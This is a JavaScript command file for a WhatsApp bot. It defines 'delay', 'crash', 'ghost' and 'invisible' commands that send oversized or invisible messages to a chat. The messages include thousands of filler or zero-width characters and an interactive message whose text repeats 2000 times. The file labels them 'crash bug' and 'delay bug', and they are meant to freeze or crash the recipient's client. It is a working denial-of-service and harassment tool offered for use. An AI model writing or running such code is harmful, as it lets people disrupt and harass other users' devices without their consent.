const { cmd } = require('../command');

cmd({
    pattern: "delay",
    alias: ["lag"],
    desc: "Send delay bug",
    category: "other",
    react: "🐢",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        let text = '';
        for(let i = 0; i < 4000; i++) text += 'ㅤ'; 
        await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐍𝐓' });
    } catch (e) {
        reply(`❌ ${e.message}`);
    }
});

cmd({
    pattern: "crash",
    alias: ["crashbug"],
    desc: "Send crash bug",
    category: "other",
    react: "💣",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        // FIX: jidDecode nathi karala direct interactive yawanawa
        const crash = {
            interactiveMessage: {
                body: { text: "𝐑𝐈𝐊𝐀-𝐂𝐑𝐀𝐒𝐇 ".repeat(2000) }, // 35k wage
                nativeFlowMessage: { 
                    buttons: [
                        { name: "cta_url", buttonParamsJson: '{"display_text":"CLICK","url":"https://wa.me"}' }
                    ]
                }
            }
        };
        await conn.relayMessage(from, crash, { messageId: m.key.id });
        reply('✅ Crash bug sent');
    } catch (e) {
        reply(`❌ ${e.message}`);
    }
});

cmd({
    pattern: "ghost",
    alias: ["ghostbug"],
    desc: "Send ghost text",
    category: "other",
    react: "👻",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        for(let i = 0; i < 5; i++) {
            await conn.sendMessage(from, { text: 'ㅤ' });
        }
        reply('✅ Ghost bug sent x5');
    } catch (e) {
        reply(`❌ ${e.message}`);
    }
});

cmd({
    pattern: "invisible",
    alias: ["invisiblebug", "blank"],
    desc: "Send invisible bug",
    category: "other",
    react: "🫥",
    filename: __filename
},
async (conn, m, { from, reply }) => {
    try {
        await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
        reply('✅ Invisible bug sent');
    } catch (e) {
        reply(`❌ ${e.message}`);
    }
});
